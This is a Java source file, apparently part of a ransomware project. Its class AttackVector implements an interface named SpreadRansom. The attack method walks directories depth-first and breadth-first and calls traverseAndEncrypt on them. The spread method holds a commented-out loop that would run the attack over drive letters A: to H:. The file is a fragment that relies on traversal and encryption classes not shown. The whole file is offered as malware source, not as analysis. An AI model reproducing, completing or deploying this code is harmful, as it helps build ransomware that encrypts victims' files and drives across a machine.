package Agent.Attack;

import java.io.File;
import java.util.Collection;
import java.util.Collections;
import Agent.SpreadR.SpreadRansom;
import Agent.traversal.*;
public class AttackVector implements SpreadRansom {

public void attack(String inputDir, Collection<File> dirs)
{
	TraverseUtil dfs=new DFS();
	dfs.traverseAndEncrypt(inputDir, dirs);
	//or
	TraverseUtil bfs=new BFS();
	bfs.traverseAndEncrypt(inputDir, dirs);
	
}


	@Override
	public void spread() {

		Collection<File> visitedFolders = Collections.emptySet();

		/*for (char i = 'A'; i <= 'H'; i++) {
			attack(i + ":\\", visitedFolders);
			
		}*/

	}

}
